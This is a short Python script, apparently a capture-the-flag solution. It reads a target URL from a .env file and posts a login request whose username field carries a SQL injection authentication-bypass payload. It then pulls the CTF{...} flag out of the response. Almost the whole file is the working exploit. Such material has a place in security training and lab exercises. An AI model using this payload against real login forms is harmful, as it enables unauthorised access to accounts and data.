import requests
import re

def load_env():
    env = {}

    with open('./.env', 'r') as h:
        for line in h.readlines():
            var, val = line.strip().split('=')

            env[var] = val
    
    return env

ENV = load_env()
URL = ENV['URL']

res = requests.post(URL, data={
    "username": "\" OR 1=1))--",
    "password": ""
})

print(re.findall(r"CTF{.*?}", res.text)[0])
